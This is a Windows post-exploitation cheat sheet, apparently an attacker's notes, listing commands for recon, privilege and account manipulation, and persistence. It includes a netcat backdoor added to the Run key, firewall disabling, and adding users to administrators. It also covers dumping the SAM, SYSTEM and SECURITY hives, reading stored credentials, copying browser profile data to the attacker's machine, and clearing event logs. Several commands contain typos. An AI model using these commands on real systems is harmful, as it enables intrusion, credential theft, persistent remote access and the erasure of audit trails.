*Instead of ftp_commands.txt, use a unique name, hide the file in a datastream, or hide the file in the folder. aka don't be obvi

### Query state of Firewall, Disable Firewall, Allow a Service Through

**Query state of firewall**:

netsh firewall show state

**Disable firewall**

netsh.exe firewall set opmode mode=disable profile=all

**Allow service through firewall**

netsh.exe firewall set portopening tcp 123 MYSERVICE enable all

netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe

HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat

netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE


**Query current user and privilege information**

whoami

whoami /all

whoami /user

whoami /groups

whoami /priv

**[Users]**

net users: list users

**For more info on a user**:

net user <username> (for local user)
  
net user <username> /domain (for a domain user)

**View domain admins**:

net group "Domain Admins" /domain

**View name of domain controller**:

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC
  
**Add user**:

net users <username> <password> /add

**Add user to local administrators group**:

net localgroup administrators <username> /add

**Delete a user**:

net users username /delete /domain

**Change user's password**:

net users <username> <new_password>


**[Accounts & Groups]**

net accounts

net accounts /domain

net logalgroup administrators

net localgroup administrators /dmain

net group "domain Admins" /domain

net group "Enterprise Admins" /domain

net view /localgroup

net localgroup Administrators

net localgroup /Domain

gpresult: view group policy

gupdate: update group policy

gpresult /z

**[Network and misc information]**

systeminfo:  lists information about system

ipconfig/all: Query ip configuation

ipconfig /displaydns

route print: Prints machines routing table

arp -a: Lists all systems current in the machine's ARP table

nslookup: Query server information

nbtstat: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP

qwinsta: Query info about RDP sessions

net session: Query session information

net time \\computername (Shows the time of target computer)

net share: view shared resources on network



**[Query current drives on system]**

fsutil fsinfo drives


**[Grab SAM and SYSTEM files]**

type "C:/windows/repair/SAM"

type "C:/windows/repair/SYSTEM"


**[Tasks]**

tasklist /svc: lists running processes

taskkill /PID <process ID> /F : forcibly kill task
  
taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name

tasklist /V /S computername: Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount

qprocess*: Similar to tasklist but easier to read

at: Query current scheduled tasks

schtasks: Query scheduled tasks that your current user has access to see.

schtasks /query /fo csv /v > %TEMP%


**[Netstat]**

netstat -ano : to see what services are running on what ports

netstat -bano

netstat -r

netstat -na | findstr :443


**[Query information about server and workstation, Workstation domain name and Logon domain]**

net config server

net config workstation



**[Change drive to different drive letter]**

ex change to D:/ directory and list it's contents:

d: & dir

cd /d d: & dir

dir \\computername\share_or_admin_share\ (dir list a remote directory)

**[Cat contents of file located in D:/ directory]**

cd /d & type d:\blah\blah


**[net view]**

net view /domain[:DomainName]

net view \\computerName


**[Services]**

**View list processes started upon startup**

net start

wmic startup get caption,command


**[Query, Stop/Start/Pause Installed Services]**

sc query state= all

sc query <service>
  
sc <stop> <service>


**[Remote System Access]**

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

net share \\computername

tasklist /V /S computername

qwinsta /SERVER:computername

qprocess /SERVER:computername 



**[WMI]*

wmic bios

wmic qfe

wmic qfe get hotfixid (This gets patches IDs)

wmic startup

wmic service

wmic os

wmic process get caption,executablepath,commandline

wmic process call create “process_name” (executes a program)

wmic process where name=”process_name” call terminate (terminates program)

wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)

wmic useraccount (usernames, sid, and various security related goodies)

wmic useraccount get /ALL

wmic share get /ALL (you can use ? for gets help ! )

wmic startup list full (this can be a huge list!!!) 

wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)


**[Reg Command]**

reg save HKLM\Security security.hive (Save security hive to a file)

reg save HKLM\System system.hive (Save system hive to a file)

reg save HKLM\SAM sam.hive (Save sam to a file)=

reg add [\\TargetIPaddr\] [RegDomain][ \Key ]

reg export [RegDomain]\[Key] [FileName]

reg import [FileName ]

reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )


**[Deleting Logs]**

wevtutil el (list logs)

wevtutil cl


**[Uninstalling Software]**

wmic proud get name /value: gets software names

wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software



**[Permissions]**

icacls

Grant full access over directory and encompassing folders and files:

icacls "C:\windows" /grant Administrator:F /T

icacls "C:\" /grant "nt authority\system": F /T


**[Net use]**

net use: Map network shares

net use \\computername (maps IPC$ which does not show up as a drive)

net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)

**[Mount a remote share with the rights of the current user]**:

net use K: \\<ip>\<share>
  
dir K:

**[Enable remote desktop]**

reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f

net session: list session information

**[Other useful Commands]**

pkgmgr usefull /iu :"Package"

pkgmgr usefull /iu :"TellnetServer": install telnet service

pkgmgr /iu:"TelnetClient"

rundll32.exe user32.dll, LockWorkStation: locks the screen

wscript.exe <script js/vbs>

cscript.exe <script js/vbs/c#>

xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box

type "C:\documents and settings\administrator\userdata\index.dat"

type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files

type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"

cd "C:/Documents and settings\administrator\userdata" & dir

type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"

type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"

type "C:\documents and settings\administrator\userdata\index.dat"
